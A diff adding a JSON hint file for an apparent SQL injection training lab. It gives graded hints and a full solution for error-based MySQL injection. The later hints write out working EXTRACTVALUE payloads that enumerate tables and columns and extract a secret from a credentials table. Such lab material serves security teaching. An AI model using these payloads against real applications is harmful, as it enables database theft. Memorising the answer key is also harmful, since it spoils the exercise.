@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-05-error-based",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "The app shows full MySQL error messages. Errors aren't just problems — they can be a data channel."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "UNION is filtered, but functions like EXTRACTVALUE() and UPDATEXML() can force MySQL to include query results inside error messages."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "Try: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- to discover tables via error output."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Find the 'credentials' table, then extract its columns. Use: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret FROM credentials LIMIT 1)))-- to pull the flag."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "1) Enumerate tables: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))-- 2) Find columns: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='credentials' LIMIT 1,1)))-- 3) Extract flag: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT secret FROM credentials LIMIT 1)))-- Note: EXTRACTVALUE output is truncated to ~32 chars; use SUBSTRING for longer flags."
+    }
+  ]
+}
